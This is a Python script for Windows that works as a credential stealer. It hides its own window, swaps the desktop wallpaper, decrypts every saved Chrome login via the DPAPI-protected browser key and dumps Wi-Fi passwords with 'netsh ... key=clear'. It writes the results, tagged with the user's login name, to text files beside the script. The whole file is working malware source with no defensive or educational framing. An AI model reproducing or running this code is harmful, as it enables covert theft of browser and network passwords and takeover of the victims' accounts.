import ctypes
import os.path
import subprocess
import re
import sys
from pathlib import Path
import os
import io
import json
import base64
import sqlite3
import win32.win32crypt as win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import win32.win32gui as win32gui,win32.lib.win32con as win32con


the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)

try:
    dir_path = os.path.dirname(os.path.realpath(__file__))+"\\"+"wall.jpg"
    ctypes.windll.user32.SystemParametersInfoW(20,0,dir_path, 0)
except:
    print("Some Error")    




#get chrome passwords

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
def main():
    get_wifi_passes()
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    path_to_file = os.path.dirname(os.path.realpath(__file__))+"\\"+"passes.txt"
    with open(path_to_file,'a+',encoding="utf-8") as fh_name:
        fh_name.write("\n\n-----------------------------"+str(os.getlogin())+"------------------------------------------------------\n\n")
        fh_name.close
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]

        
        

        with open(path_to_file,'a+',encoding="utf-8") as fh:
            if username or password:
                fh.write(f"\n\nOrigin URL: {origin_url}\n")
                fh.write(f"Action URL: {action_url}\n")
                fh.write(f"Username: {username}\n")
                fh.write(f"Password: {password}\n")
            else:
                continue        
        with open(path_to_file,'a+',encoding="utf-8") as fh_date:
            if date_created != 86400000000 and date_created:
                fh_date.write(f"Creation date: {str(get_chrome_datetime(date_created))}")
            if date_last_used != 86400000000 and date_last_used:
                fh_date.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass


def get_wifi_passes():
    process = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode('unicode_escape')

    profile_names = re.findall("All User Profile     : (.*)\r", process)

    wifi_list = list()

    if(len(profile_names) != 0):
        for name in profile_names:
            wifi_profile = dict()

            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode('unicode_escape')

            if re.search("Security key           : Absent", profile_info):
                continue

            else:
                wifi_profile["ssid"] = name

                profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode('unicode_escape')

                password = re.search("Key Content            : (.*)\r", profile_info_pass)

                if password == None:
                    wifi_profile["password"] = None

                else:
                    wifi_profile["password"] = password[1]

                wifi_list.append(wifi_profile)


    path_to_list = os.path.dirname(os.path.realpath(__file__))+"\\"+"wifilist.txt"


    with open(path_to_list, 'a+') as fh_wifi_pass:
        fh_wifi_pass.write("\n\n-----------------------------"+str(os.getlogin())+"------------------------------------------------------\n\n")
        for x in wifi_list:
            fh_wifi_pass.write(f"SSID: {x['ssid']}\nPassword: {x['password']}\n")    



if __name__ == "__main__":
    try:
        main()
    except:
        exit    
        
        